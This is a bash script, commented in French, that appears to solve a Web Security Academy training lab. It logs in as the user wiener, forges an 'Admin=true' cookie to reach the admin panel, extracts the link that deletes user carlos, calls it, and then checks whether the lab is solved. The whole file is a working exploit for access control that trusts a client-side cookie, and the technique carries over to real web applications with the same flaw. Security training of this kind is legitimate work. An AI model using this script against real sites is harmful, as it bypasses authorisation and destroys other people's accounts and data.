#!/bin/bash

# Usage: ./cookie_admin_true.sh <LAB_URL>
if [ $# -ne 1 ]; then
    echo "Usage: $0 <LAB_URL>"
    echo "Exemple : $0 https://votre-lab.web-security-academy.net"
    exit 1
fi

LAB_URL="$1"
LOGIN_PATH="/login"
ADMIN_PATH="/admin"
COOKIEJAR="cookiejar.txt"

echo "=== PHASE DE CONNEXION ==="
echo "[*] Connexion à l'utilisateur wiener..."
curl -sk -c "$COOKIEJAR" -d "username=wiener&password=peter" -X POST "$LAB_URL$LOGIN_PATH" -o /dev/null

SESSION_COOKIE=$(grep -i 'session' "$COOKIEJAR" | awk '{print $7}' | head -n1)
ADMIN_COOKIE=$(grep -i 'Admin' "$COOKIEJAR" | awk '{print $7}' | head -n1)

if [ -z "$SESSION_COOKIE" ]; then
    echo "[-] Échec : impossible d'obtenir un cookie de session."
    rm -f "$COOKIEJAR"
    exit 1
fi

echo "[+] Cookie de session récupéré : session=$SESSION_COOKIE"
echo "[*] On force le cookie Admin=true pour la suite."

echo
echo "=== PHASE D'ATTAQUE ==="
echo "[*] Accès au panneau admin avec Admin=true..."

# Construction du header Cookie
COOKIES="session=$SESSION_COOKIE; Admin=true"

# Accès au panneau admin
curl -sk -b "$COOKIES" "$LAB_URL$ADMIN_PATH" -o admin.html

# Extraction du lien de suppression de carlos (par exemple /admin/delete?username=carlos)
DELETE_LINK=$(grep -Eo 'href="(/admin/delete\?username=carlos)"' admin.html | head -n1 | cut -d'"' -f2)

if [ -z "$DELETE_LINK" ]; then
    echo "[-] Lien de suppression de carlos non trouvé dans le panneau admin."
    cat admin.html | head -20
    rm -f "$COOKIEJAR" admin.html
    exit 1
fi

echo "[+] Lien de suppression trouvé : $DELETE_LINK"
echo "[*] Suppression de carlos..."

curl -sk -b "$COOKIES" "$LAB_URL$DELETE_LINK" -o /dev/null

echo
echo "=== PHASE DE CONTRÔLE ==="
RESULT=$(curl -sk "$LAB_URL" | grep -Ei "congratulations|solved|success")
if [ -n "$RESULT" ]; then
    echo "[+] Succès : le lab semble résolu !"
else
    echo "[-] Échec : le lab n'a pas été résolu automatiquement."
fi

rm -f "$COOKIEJAR" admin.html
